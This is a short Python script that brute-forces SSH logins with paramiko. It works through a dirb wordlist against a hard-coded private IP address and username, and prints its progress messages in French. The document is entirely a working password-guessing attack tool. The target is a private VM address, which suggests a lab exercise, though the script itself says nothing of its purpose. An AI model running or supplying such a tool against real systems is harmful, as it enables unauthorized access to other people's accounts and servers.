import paramiko
import os
from utiles import *

def ssh_brute_force(hostname, username):

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    wordlist_path = "/usr/share/dirb/wordlists/small.txt" 
    with open(wordlist_path, 'r', errors='ignore') as f:
        passwords = f.readlines()

    total_passwords = len(passwords)
    tested_passwords = 0

    for password in passwords:
        password = password.strip()
        try:
            ssh.connect(hostname, username=username, password=password)
            print(f"Mot de passe trouvé : {password}")
            ssh.close()
            return True
        except:
            pass 
        finally:
            tested_passwords += 1
            progress = (tested_passwords / total_passwords) * 100
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"Test en cours : {progress:.2f}%")
            print(f"Mots de passe testés : {password}")

    print_red("Échec de toutes les tentatives de connexion SSH.")
    return False

hostname = '10.0.2.15'
username = 'yassir'
ssh_brute_force(hostname, username)
